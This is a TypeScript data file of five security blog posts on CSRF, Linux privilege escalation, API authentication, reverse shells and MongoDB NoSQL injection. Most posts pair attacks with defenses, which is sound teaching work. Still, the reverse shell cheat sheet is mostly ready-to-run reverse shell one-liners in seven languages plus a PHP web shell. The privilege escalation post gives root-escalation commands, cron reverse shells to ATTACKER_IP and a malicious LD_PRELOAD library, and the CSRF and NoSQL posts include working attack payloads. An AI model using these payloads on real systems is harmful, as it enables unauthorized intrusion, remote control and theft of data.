import { BlogPost } from "./blog-data";

export const trafficBatch3Articles: BlogPost[] = [
  {
    slug: "csrf-attack-explained-prevention-tokens-samesite",
    title: "CSRF Attacks Explained: Tokens, SameSite Cookies & Modern Defenses",
    excerpt:
      "Cross-Site Request Forgery still bypasses modern frameworks. Learn how CSRF works, why SameSite cookies aren't enough, and how to implement bulletproof defenses.",
    content: `## What Is CSRF and Why Does It Still Work?

Cross-Site Request Forgery (CSRF) tricks a user's browser into making unintended requests to a site where they're already authenticated. The browser automatically includes cookies — so the server thinks it's a legitimate request.

### How a CSRF Attack Works

\`\`\`
1. User logs into bank.com (session cookie set)
2. User visits evil.com (in another tab)
3. evil.com contains hidden form:

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>

4. Browser sends the request WITH the user's bank.com session cookie
5. Bank processes the transfer — it looks legitimate
\`\`\`

> This works because the browser **automatically attaches cookies** to any request matching the cookie's domain, regardless of which website initiated the request.

---

## CSRF Attack Variants

### 1. Form-Based CSRF (Classic)

\`\`\`html
<!-- Hidden auto-submitting form -->
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="https://target.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
</body>
\`\`\`

### 2. Image Tag CSRF (GET Requests)

\`\`\`html
<!-- Triggers GET request silently -->
<img src="https://target.com/api/delete-account?confirm=true" width="0" height="0" />
\`\`\`

### 3. XMLHttpRequest CSRF

\`\`\`javascript
// Works if CORS allows it or for simple requests
fetch('https://target.com/api/change-password', {
  method: 'POST',
  credentials: 'include', // Sends cookies
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'new_password=hacked123'
});
\`\`\`

### 4. JSON-Based CSRF

\`\`\`html
<!-- Exploiting content-type bypass -->
<form action="https://target.com/api/update-profile" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' />
</form>
\`\`\`

This sends: \`{"role":"admin","ignore":"="}\` — valid JSON that changes the user's role.

---

## Defense #1: CSRF Tokens (Synchronizer Pattern)

The most reliable defense. Generate a random token, embed it in forms, and verify on the server.

\`\`\`typescript
// Server: Generate CSRF token
import crypto from 'crypto';

function generateCsrfToken(session: Session): string {
  const token = crypto.randomBytes(32).toString('hex');
  session.csrfToken = token;
  return token;
}

// Server: Verify CSRF token
function verifyCsrfToken(req: Request, session: Session): boolean {
  const token = req.body._csrf || req.headers['x-csrf-token'];
  if (!token || token !== session.csrfToken) {
    return false;
  }
  // Rotate token after use (one-time use)
  session.csrfToken = crypto.randomBytes(32).toString('hex');
  return true;
}

// Express middleware
function csrfProtection(req: Request, res: Response, next: NextFunction) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next(); // Safe methods don't need CSRF protection
  }
  
  if (!verifyCsrfToken(req, req.session)) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}
\`\`\`

\`\`\`html
<!-- Client: Include token in forms -->
<form method="POST" action="/api/transfer">
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
  <input name="amount" />
  <button type="submit">Transfer</button>
</form>
\`\`\`

---

## Defense #2: SameSite Cookies

\`\`\`typescript
// Set SameSite attribute on session cookies
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',   // Blocks cross-site POST requests
  // sameSite: 'strict' // Blocks ALL cross-site requests (breaks OAuth flows)
  maxAge: 3600000,
});
\`\`\`

| SameSite Value | Cross-Site POST | Cross-Site GET | OAuth Flows |
|---------------|----------------|---------------|-------------|
| **None** | ✅ Sent (vulnerable) | ✅ Sent | ✅ Works |
| **Lax** (default) | ❌ Blocked | ✅ Sent (top-level) | ✅ Works |
| **Strict** | ❌ Blocked | ❌ Blocked | ❌ Breaks |

### Why SameSite Isn't Enough Alone

1. **Lax allows GET requests** — if your app has state-changing GET endpoints, they're still vulnerable
2. **Subdomain bypass** — attacker on sub.target.com can still send cookies
3. **Browser bugs** — Some older browsers don't enforce SameSite properly
4. **WebSocket bypass** — SameSite doesn't apply to WebSocket connections

**Always combine SameSite cookies with CSRF tokens** for defense-in-depth.

---

## Defense #3: Double Submit Cookie

For stateless APIs where you can't store tokens in sessions:

\`\`\`typescript
// Set a random CSRF cookie
const csrfValue = crypto.randomBytes(32).toString('hex');
res.cookie('csrf', csrfValue, { 
  httpOnly: false, // Client needs to read this
  secure: true, 
  sameSite: 'lax' 
});

// Middleware: Verify cookie value matches header value
function doubleSubmitCheck(req: Request, res: Response, next: NextFunction) {
  const cookieValue = req.cookies.csrf;
  const headerValue = req.headers['x-csrf-token'];
  
  if (!cookieValue || cookieValue !== headerValue) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  next();
}
\`\`\`

\`\`\`javascript
// Client: Read cookie and send as header
const csrfToken = document.cookie
  .split('; ')
  .find(c => c.startsWith('csrf='))
  ?.split('=')[1];

fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ amount: 100 }),
});
\`\`\`

---

## Framework-Specific CSRF Protection

### Next.js Server Actions

Next.js Server Actions have built-in CSRF protection via the \`Next-Action\` header — but verify this is enforced in your version.

### Django

\`\`\`python
# Built-in — just use the template tag
{% csrf_token %}

# For AJAX, read the csrftoken cookie and send as X-CSRFToken header
\`\`\`

### Express

\`\`\`typescript
import { doubleCsrf } from 'csrf-csrf';

const { doubleCsrfProtection, generateToken } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET!,
  cookieName: '__csrf',
  cookieOptions: { secure: true, sameSite: 'lax' },
});

app.use(doubleCsrfProtection);
\`\`\`

---

## CSRF Testing Checklist

- [ ] All state-changing endpoints require CSRF tokens
- [ ] Session cookies have \`SameSite=Lax\` or \`Strict\`
- [ ] No state-changing operations on GET requests
- [ ] CSRF tokens are random, unique per session, and verified server-side
- [ ] Custom headers required for API calls (\`X-Requested-With\`, \`X-CSRF-Token\`)
- [ ] Content-Type validation rejects unexpected \`text/plain\` submissions
- [ ] WebSocket connections verify origin header`,
    date: "2026-03-10",
    author: "SCRs Team",
    category: "Application Security",
    tags: ["csrf", "cross-site request forgery", "samesite", "cookies", "web security", "tokens"],
    readTime: "14 min read",
  },
  {
    slug: "linux-privilege-escalation-techniques-hackers-use",
    title: "Linux Privilege Escalation: 15 Techniques Hackers Use to Get Root",
    excerpt:
      "From SUID binaries to kernel exploits — every privilege escalation technique pentesters use on Linux, with detection commands and real-world examples.",
    content: `## Why Privilege Escalation Matters

You've gained a shell on a Linux system — but you're a low-privilege user. Privilege escalation is how you go from \`www-data\` to \`root\`, turning limited access into total system compromise.

> **In pentesting:** Initial access is hard. Privesc is where most targets fall.
> **In defense:** If an attacker can't escalate, a shell is far less dangerous.

---

## Technique 1: SUID Binary Exploitation

SUID (Set User ID) binaries run with the permissions of their owner — often root.

\`\`\`bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common exploitable SUID binaries:
# /usr/bin/find
find . -exec /bin/bash -p \\;

# /usr/bin/vim
vim -c ':!/bin/bash'

# /usr/bin/python3
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# /usr/bin/nmap (older versions)
nmap --interactive
!sh
\`\`\`

Check GTFOBins (https://gtfobins.github.io) for exploitation techniques for any binary.

---

## Technique 2: Sudo Misconfigurations

\`\`\`bash
# Check what sudo permissions you have
sudo -l

# Example output:
# (ALL) NOPASSWD: /usr/bin/vim
# Exploit: sudo vim -c ':!/bin/bash'

# (ALL) NOPASSWD: /usr/bin/find
# Exploit: sudo find . -exec /bin/bash \\;

# (ALL) NOPASSWD: /usr/bin/less
# Exploit: sudo less /etc/passwd → !bash

# (ALL) NOPASSWD: /usr/bin/awk
# Exploit: sudo awk 'BEGIN {system("/bin/bash")}'

# (ALL) NOPASSWD: /usr/bin/env
# Exploit: sudo env /bin/bash

# (ALL) NOPASSWD: /usr/bin/tar
# Exploit: sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
\`\`\`

---

## Technique 3: Cron Job Exploitation

\`\`\`bash
# Check for cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Look for writable scripts executed by root
# If /opt/backup.sh runs as root and you can write to it:
echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# Look for wildcard injection in cron commands
# If cron runs: tar czf /tmp/backup.tar.gz *
# Create exploit files:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > shell.sh
\`\`\`

---

## Technique 4: Writable /etc/passwd

\`\`\`bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# If writable, add a root user:
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add to /etc/passwd
echo 'hacker:$1$xyz$hash_here:0:0::/root:/bin/bash' >> /etc/passwd

# Login as root
su hacker
\`\`\`

---

## Technique 5: Kernel Exploits

\`\`\`bash
# Check kernel version
uname -a
cat /proc/version

# Search for kernel exploits
# DirtyPipe (CVE-2022-0847) — Linux 5.8+
# DirtyCow (CVE-2016-5195) — Linux 2.6.22 to 4.8.3
# GameOver(lay)  (CVE-2023-2640) — Ubuntu OverlayFS

# Use linux-exploit-suggester
./linux-exploit-suggester.sh
\`\`\`

---

## Technique 6: Capabilities

\`\`\`bash
# Find binaries with elevated capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid on python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search on tar (read any file)
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz
cat etc/shadow
\`\`\`

---

## Technique 7: Writable Docker Socket

\`\`\`bash
# Check if you're in the docker group
id | grep docker

# If yes — instant root:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
\`\`\`

---

## Technique 8: PATH Hijacking

\`\`\`bash
# If a SUID binary calls a command without full path:
# e.g., the binary runs "service apache2 restart"

# Create malicious "service" binary in a writable directory
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service

# Prepend our directory to PATH
export PATH=/tmp:$PATH

# Run the vulnerable SUID binary — it calls our "service" instead
./vulnerable-binary
\`\`\`

---

## Technique 9: NFS No Root Squash

\`\`\`bash
# Check for NFS shares with no_root_squash
cat /etc/exports
# /shared *(rw,no_root_squash)

# From attacker machine (as root):
mount -o rw TARGET_IP:/shared /mnt
# Create SUID bash on the shared mount
cp /bin/bash /mnt/rootbash
chmod +s /mnt/rootbash

# On target machine:
/shared/rootbash -p  # Root shell!
\`\`\`

---

## Technique 10: Environment Variables in SUID Programs

\`\`\`bash
# LD_PRELOAD (if sudo env_keep includes LD_PRELOAD)
# Create malicious shared library:
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# Run with LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/any-allowed-sudo-command
\`\`\`

---

## Automated Enumeration Scripts

\`\`\`bash
# LinPEAS — The gold standard
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
./les.sh
\`\`\`

---

## Quick Reference: Escalation Checklist

\`\`\`bash
# 1. System info
uname -a && cat /etc/os-release

# 2. SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null

# 3. Sudo permissions
sudo -l

# 4. Cron jobs
cat /etc/crontab && ls -la /etc/cron.d/

# 5. Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# 6. Capabilities
getcap -r / 2>/dev/null

# 7. Running processes
ps aux | grep root

# 8. Network services
ss -tlnp

# 9. SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# 10. Passwords in files
grep -rli 'password' /etc/ /opt/ /var/ 2>/dev/null
\`\`\`

Understanding these techniques helps defenders identify weaknesses before attackers do. Always practice on authorized systems like HackTheBox, TryHackMe, or your own lab machines.`,
    date: "2026-03-07",
    author: "SCRs Team",
    category: "Application Security",
    tags: ["linux", "privilege escalation", "penetration testing", "suid", "kernel exploit", "ctf", "red team"],
    readTime: "16 min read",
  },
  {
    slug: "api-authentication-jwt-vs-session-vs-oauth-comparison",
    title: "API Authentication: JWT vs Session vs OAuth 2.0 Security Comparison",
    excerpt:
      "Compare JWT, server-side sessions, and OAuth 2.0 for API authentication, including security trade-offs, cookie vs token risks, and when each approach is the right fit.",
    content: `## The Authentication Decision Tree

Choosing the right authentication method is one of the most impactful security decisions you'll make. Here's the quick answer:

\`\`\`
Your App → Is it a traditional web app?
  ├── Yes → Server-side sessions (with cookies)
  └── No → Is it a mobile app or SPA calling your own API?
        ├── Yes → Short-lived JWTs + Refresh tokens (HttpOnly cookies)
        └── No → Is it third-party API access?
              ├── Yes → OAuth 2.0 (Authorization Code + PKCE)
              └── No → API Keys (for server-to-server)
\`\`\`

---

## Option 1: Server-Side Sessions

The oldest and most battle-tested approach. The server stores session data; the client holds only a session ID in a cookie.

### How It Works

\`\`\`
1. User submits login form
2. Server verifies credentials
3. Server creates session in store (Redis/DB)
4. Server sends session ID as HttpOnly cookie
5. Browser sends cookie with every request
6. Server looks up session to identify user
\`\`\`

### Implementation

\`\`\`typescript
import session from 'express-session';
import RedisStore from 'connect-redis';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

app.use(session({
  store: new RedisStore({ client: redis }),
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
  },
}));

// Login
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  
  req.session.userId = user.id;
  req.session.role = user.role;
  res.json({ message: 'Logged in' });
});

// Protected route
app.get('/profile', (req, res) => {
  if (!req.session.userId) return res.status(401).json({ error: 'Not authenticated' });
  // ... fetch and return user data
});

// Logout — instantly invalidates the session
app.post('/logout', (req, res) => {
  req.session.destroy(() => {
    res.clearCookie('connect.sid');
    res.json({ message: 'Logged out' });
  });
});
\`\`\`

### Pros & Cons

| ✅ Pros | ❌ Cons |
|---------|---------|
| Instant revocation (delete session) | Requires session store (Redis) |
| Server controls all session data | Doesn't scale to multiple domains easily |
| Smaller cookie size (~32 bytes) | Stateful — every request hits the store |
| Battle-tested for 25+ years | CSRF protection required |

---

## Option 2: JWT (JSON Web Tokens)

Stateless tokens that contain user claims. The server doesn't need to store anything — the token itself is the proof.

### How It Works

\`\`\`
1. User submits login credentials
2. Server verifies and creates signed JWT
3. Client stores JWT (cookie or memory)
4. Client sends JWT with every request
5. Server verifies signature — no database lookup needed
\`\`\`

### Implementation

\`\`\`typescript
import jwt from 'jsonwebtoken';

const ACCESS_SECRET = process.env.JWT_ACCESS_SECRET!;
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET!;

// Login — issue access + refresh tokens
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  
  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    ACCESS_SECRET,
    { expiresIn: '15m' }  // Short-lived!
  );
  
  const refreshToken = jwt.sign(
    { userId: user.id, tokenVersion: user.tokenVersion },
    REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  // ✅ Store tokens in HttpOnly cookies (not localStorage!)
  res.cookie('access_token', accessToken, {
    httpOnly: true, secure: true, sameSite: 'lax', maxAge: 900000,
  });
  res.cookie('refresh_token', refreshToken, {
    httpOnly: true, secure: true, sameSite: 'lax', 
    maxAge: 7 * 86400000, path: '/api/auth/refresh',
  });
  
  res.json({ message: 'Logged in' });
});

// Middleware: Verify access token
function authenticate(req: Request, res: Response, next: NextFunction) {
  const token = req.cookies.access_token;
  if (!token) return res.status(401).json({ error: 'No token' });
  
  try {
    const payload = jwt.verify(token, ACCESS_SECRET) as JWTPayload;
    req.user = payload;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
}

// Refresh endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refresh_token;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });
  
  try {
    const payload = jwt.verify(refreshToken, REFRESH_SECRET) as RefreshPayload;
    
    // ✅ Check token version (for revocation)
    const user = await db.user.findById(payload.userId);
    if (!user || user.tokenVersion !== payload.tokenVersion) {
      return res.status(401).json({ error: 'Token revoked' });
    }
    
    // Issue new access token
    const newAccessToken = jwt.sign(
      { userId: user.id, role: user.role },
      ACCESS_SECRET,
      { expiresIn: '15m' }
    );
    
    res.cookie('access_token', newAccessToken, {
      httpOnly: true, secure: true, sameSite: 'lax', maxAge: 900000,
    });
    res.json({ message: 'Token refreshed' });
  } catch {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
});
\`\`\`

### JWT Security Rules

1. **Never store in localStorage** — vulnerable to XSS. Use HttpOnly cookies.
2. **Keep access tokens short-lived** — 15 minutes max.
3. **Use refresh token rotation** — new refresh token with each refresh.
4. **Include tokenVersion** — increment on password change/logout to revoke all tokens.
5. **Validate algorithm** — prevent \`alg: none\` attacks.

---

## Option 3: OAuth 2.0

For third-party access ("Login with Google") or when external apps need to call your API on behalf of users.

### When to Use OAuth vs JWT

| Scenario | Best Choice |
|----------|-------------|
| Your frontend → Your API | Sessions or JWT |
| "Login with Google" button | OAuth 2.0 (OIDC) |
| Third-party app → Your API | OAuth 2.0 |
| Mobile app → Your API | JWT with PKCE flow |
| Microservice → Microservice | JWT or mTLS |
| CLI tool → API | OAuth 2.0 Device Flow |

---

## Comparison Summary

| Feature | Sessions | JWT | OAuth 2.0 |
|---------|----------|-----|-----------|
| **Stateful/Stateless** | Stateful | Stateless | Depends |
| **Instant revocation** | ✅ Easy | ❌ Hard (needs denylist) | ✅ Via provider |
| **Scalability** | Needs shared store | ✅ No server state | ✅ Delegated |
| **Cross-domain** | ❌ Difficult | ✅ Easy | ✅ Designed for it |
| **XSS risk** | Low (HttpOnly cookie) | High if in localStorage | Varies |
| **CSRF risk** | Yes (needs tokens) | No (if in headers) | Varies |
| **Complexity** | Low | Medium | High |
| **Best for** | Traditional web apps | SPAs, mobile, microservices | Third-party access |

The safest option for most web applications: **Server-side sessions with Redis**. If you need stateless tokens for mobile/SPA: **JWT in HttpOnly cookies with short expiry and refresh rotation.**`,
    date: "2026-03-04",
    author: "SCRs Team",
    category: "Application Security",
    tags: ["API authentication", "JWT vs session", "OAuth 2.0", "authentication security", "API security", "cookies vs tokens", "JWT security"],
    readTime: "16 min read",
  },
  {
    slug: "reverse-shell-cheat-sheet-pentest-2026",
    title: "Reverse Shell Cheat Sheet: Every Payload for Pentesters (2026 Updated)",
    excerpt:
      "Bash, Python, PHP, PowerShell, Node.js, Go — reverse shell one-liners for every language plus listener setup, detection techniques, and defensive countermeasures.",
    content: `## What Is a Reverse Shell?

A reverse shell makes the **target machine** connect back to the **attacker's machine**, providing an interactive command line. Unlike a bind shell (which opens a port on the target), reverse shells work through firewalls because the connection is outbound.

\`\`\`
Attacker (Listener)              Target (Victim)
┌────────────────┐               ┌────────────────┐
│ nc -lvnp 4444  │◄─────────────│ Reverse Shell   │
│ IP: 10.10.14.5 │  Outbound    │ Payload Runs    │
│ Waits for      │  Connection  │ Connects to     │
│ connection     │              │ attacker:4444   │
└────────────────┘               └────────────────┘
\`\`\`

> **⚠️ Legal disclaimer:** Only use these on systems you own or have explicit written authorization to test. Unauthorized access is a criminal offense.

---

## Setting Up the Listener

\`\`\`bash
# Basic Netcat listener
nc -lvnp 4444

# Netcat with readline (better UX)
rlwrap nc -lvnp 4444

# Socat (upgraded interactive shell)
socat file:\\\`tty\\\`,raw,echo=0 tcp-listen:4444

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
\`\`\`

---

## Reverse Shell Payloads by Language

### Bash

\`\`\`bash
# Standard bash reverse shell
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Alternative with explicit redirection
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Using /dev/tcp (if bash supports it)
exec 5<>/dev/tcp/10.10.14.5/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
\`\`\`

### Python

\`\`\`python
# Python 3 reverse shell
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# Python 2 (legacy systems)
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
\`\`\`

### PHP

\`\`\`php
# PHP reverse shell
php -r '$sock=fsockopen("10.10.14.5",4444);exec("bash <&3 >&3 2>&3");'

# PHP command execution via web shell
<?php system($_GET['cmd']); ?>
// Usage: http://target.com/shell.php?cmd=id
\`\`\`

### Node.js

\`\`\`javascript
// Node.js reverse shell
require('child_process').exec('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1')

// Pure Node.js (no bash dependency)
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("bash",[]);var client=new net.Socket();client.connect(4444,"10.10.14.5",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});})()
\`\`\`

### PowerShell (Windows)

\`\`\`powershell
# PowerShell reverse shell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Encoded PowerShell (bypass basic filters)
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0A...
\`\`\`

### Perl

\`\`\`perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
\`\`\`

### Ruby

\`\`\`ruby
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.5",4444))'
\`\`\`

---

## Upgrading to a Fully Interactive Shell

After getting a basic reverse shell, upgrade it:

\`\`\`bash
# Step 1: Spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell
Ctrl+Z

# Step 3: Fix terminal settings
stty raw -echo; fg

# Step 4: Set terminal type
export TERM=xterm
export SHELL=bash
stty rows 50 cols 200
\`\`\`

---

## Defensive Detection

### Network Indicators

\`\`\`bash
# Detect outbound connections from web servers
ss -tlnp | grep -v LISTEN
lsof -i -P | grep ESTABLISHED | grep -v sshd

# Look for unusual outbound connections
netstat -an | grep ESTABLISHED | grep -v ':22\\|:80\\|:443'
\`\`\`

### Process Monitoring

\`\`\`bash
# Detect spawned shells
ps aux | grep -E 'bash|sh|python|perl|ruby|nc|ncat|socat' | grep -v grep

# Check for /dev/tcp usage (bash reverse shells)
grep -r '/dev/tcp' /proc/*/fd/ 2>/dev/null
\`\`\`

### Prevention

1. **Egress filtering** — Block outbound connections from web servers except to known services
2. **Application allowlisting** — Only approved binaries can execute
3. **Disable unnecessary interpreters** — Remove Python, Perl, Ruby from production web servers
4. **Monitor /dev/tcp** — Alert on bash processes accessing /dev/tcp
5. **Container isolation** — Run applications in containers with minimal tools
6. **WAF rules** — Block payloads containing reverse shell patterns`,
    date: "2026-03-01",
    author: "SCRs Team",
    category: "Application Security",
    tags: ["reverse shell", "penetration testing", "bash", "python", "powershell", "cheat sheet", "red team"],
    readTime: "13 min read",
  },
  {
    slug: "mongodb-nosql-injection-attacks-prevention",
    title: "MongoDB NoSQL Injection: Attack Techniques, Real-World Exploits & Prevention",
    excerpt:
      "SQL injection's lesser-known cousin — NoSQL injection — is devastating MongoDB applications. Learn operator injection, JavaScript injection, and how to protect your queries.",
    content: `## NoSQL Injection Is Hiding in Your Express + MongoDB App

Most developers know about SQL injection. Far fewer know that MongoDB applications are vulnerable to their own class of injection attacks — **NoSQL injection** — and it's just as devastating.

| Impact | SQL Injection | NoSQL Injection |
|--------|-------------|----------------|
| Authentication bypass | ✅ | ✅ |
| Data exfiltration | ✅ | ✅ |
| Data modification | ✅ | ✅ |
| Denial of service | ✅ | ✅ |
| Remote code execution | Sometimes | Yes (via $where) |

---

## Attack Type 1: Operator Injection (Authentication Bypass)

The most common NoSQL injection. Exploits MongoDB query operators like \`$gt\`, \`$ne\`, \`$regex\`.

### Vulnerable Code

\`\`\`typescript
// ❌ Express + Mongoose — VULNERABLE
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await User.findOne({ username, password });
  
  if (user) {
    res.json({ message: 'Login successful', token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
\`\`\`

### The Attack

\`\`\`bash
# Attacker sends JSON body:
curl -X POST https://target.com/login \\
  -H "Content-Type: application/json" \\
  -d '{"username": "admin", "password": {"$ne": ""}}'

# MongoDB interprets this as:
# db.users.findOne({ username: "admin", password: { $ne: "" } })
# This matches any admin user whose password is NOT empty — bypassing auth!
\`\`\`

### More Operator Injection Payloads

\`\`\`json
// Bypass with $gt (greater than)
{"username": "admin", "password": {"$gt": ""}}

// Bypass with $regex (match any password)
{"username": "admin", "password": {"$regex": ".*"}}

// Enumerate all usernames
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^b"}, "password": {"$ne": ""}}

// Match any user
{"username": {"$ne": ""}, "password": {"$ne": ""}}
\`\`\`

### Fix: Input Validation

\`\`\`typescript
// ✅ Validate input types BEFORE querying
import { z } from 'zod';

const loginSchema = z.object({
  username: z.string().min(1).max(100),
  password: z.string().min(1).max(200),
});

app.post('/login', async (req, res) => {
  // This rejects objects like { "$ne": "" } — only strings allowed
  const { username, password } = loginSchema.parse(req.body);
  
  const user = await User.findOne({ username });
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  
  // ✅ Compare hashed password — never query with raw password
  const isValid = await bcrypt.compare(password, user.passwordHash);
  if (!isValid) return res.status(401).json({ error: 'Invalid credentials' });
  
  res.json({ token: generateToken(user) });
});
\`\`\`

---

## Attack Type 2: JavaScript Injection via $where

MongoDB's \`$where\` operator executes JavaScript — creating a code injection vector.

\`\`\`typescript
// ❌ EXTREMELY DANGEROUS — user input in $where
app.get('/search', async (req, res) => {
  const { name } = req.query;
  const users = await User.find({
    $where: \\\`this.name === '\${name}'\\\`
  });
  res.json(users);
});
\`\`\`

\`\`\`bash
# Attacker extracts data via timing:
/search?name=a'; sleep(5000); var x='

# Attacker exfiltrates data:
/search?name=a'; var x=this.password; while(x[0]=='a'){sleep(100)}; var y='
\`\`\`

### Fix: Never use $where with user input

\`\`\`typescript
// ✅ Use standard query operators instead
app.get('/search', async (req, res) => {
  const name = String(req.query.name || '').slice(0, 100);
  const users = await User.find({ name: { $eq: name } });
  res.json(users);
});
\`\`\`

---

## Attack Type 3: Aggregation Pipeline Injection

\`\`\`typescript
// ❌ Vulnerable — user controls aggregation stage
app.get('/stats', async (req, res) => {
  const { groupBy } = req.query;
  const stats = await Order.aggregate([
    { $group: { _id: \\\`$\${groupBy}\\\`, total: { $sum: '$amount' } } }
  ]);
  res.json(stats);
});

// Attacker: /stats?groupBy=password
// Returns all unique passwords grouped!
\`\`\`

### Fix: Allowlist aggregation fields

\`\`\`typescript
const ALLOWED_GROUP_FIELDS = ['status', 'category', 'region'];

app.get('/stats', async (req, res) => {
  const groupBy = String(req.query.groupBy);
  
  if (!ALLOWED_GROUP_FIELDS.includes(groupBy)) {
    return res.status(400).json({ error: 'Invalid groupBy field' });
  }
  
  const stats = await Order.aggregate([
    { $group: { _id: \\\`$\${groupBy}\\\`, total: { $sum: '$amount' } } }
  ]);
  res.json(stats);
});
\`\`\`

---

## Mongoose-Specific Protections

\`\`\`typescript
// ✅ Mongoose sanitize plugin
import mongoSanitize from 'express-mongo-sanitize';

// Strips $ and . from req.body, req.query, req.params
app.use(mongoSanitize());

// ✅ Schema-level validation
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, maxlength: 100 },
  email: { type: String, required: true, match: /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/ },
  role: { type: String, enum: ['user', 'admin'], default: 'user' },
});

// ✅ Explicitly use $eq for equality checks
User.findOne({ username: { $eq: userInput } });
\`\`\`

---

## NoSQL Injection Prevention Checklist

- [ ] Input validation with strict schemas (Zod, Joi)
- [ ] \`express-mongo-sanitize\` middleware installed
- [ ] Never use \`$where\` with user input
- [ ] Never query with raw password — always hash and compare
- [ ] Allowlist fields for sort, project, and groupBy operations
- [ ] Use \`$eq\` operator explicitly in queries
- [ ] Disable server-side JavaScript (\`--noscripting\` flag)
- [ ] Parameterize all query values
